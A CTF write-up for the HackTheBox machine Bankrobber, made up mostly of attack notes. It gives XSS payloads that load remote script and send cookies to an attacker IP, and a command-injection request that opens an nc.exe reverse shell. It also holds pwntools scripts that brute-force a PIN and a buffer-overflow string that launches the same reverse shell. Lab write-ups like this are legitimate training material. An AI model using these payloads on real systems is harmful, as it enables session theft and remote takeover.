---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/w2K-bQNs3cg/0.jpg
layout: post
media_subpath: /assets/posts/2020-03-07-bankrobber-hackthebox
tags:
- binary exploitation
- command injection
- hackthebox
- stack overflow
- windows
- xss
title: Bankrobber @ HackTheBox
---

Bankrobber is a 50-point machine on hackthebox that involves exploiting a cross site scripting vulnerability to gain access to an admin account, using a command injection to get a user shell and exploiting a simple buffer overflow to become system.

{% youtube w2K-bQNs3cg %}

## Notes

XSS-Payloads:

```html
<script src="http://<ip>:8000/script.js"></script>
```

```js
function addImg(){
    var img = document.createElement('img');
    img.src = 'http://<ip>:8000/' + document.cookie;
    document.body.appendChild(img);
}
addImg();
```

```js
var xhr = new XMLHttpRequest();
document.cookie = "id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D";
var uri ="/admin/backdoorchecker.php";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cmd=dir|\\\\<ip>\\xshare\\share\\nc.exe <ip> 7000 -e cmd.exe");
```

SSF:

<https://securesocketfunneling.github.io/ssf/#home>

Python-Scripts:

```python
from pwn import *

context.proxy = (socks.SOCKS4, 'localhost', 9090)
p = remote('localhost', 910, level='info')    
p.interactive()
```

```python
from pwn import *

context.proxy = (socks.SOCKS4, 'localhost', 9090)

for i in range(1000):
    p = remote('localhost', 910, level='info')
    p.recvuntil('[$] ')
    pin = str(i).zfill(4)
    p.sendline(pin)
    result = p.recvline()
    if not "denied" in result:
        log.success("Found Pin:" + str(pin))
        break
p.interactive()
```

Overflow-Payload:

```
AAAAAAAABBBBBBBCCCCCCCCDDDDDDD\\\\10.10.14.2\xshare\share\nc.exe <ip> 7000 -e cmd.exe
```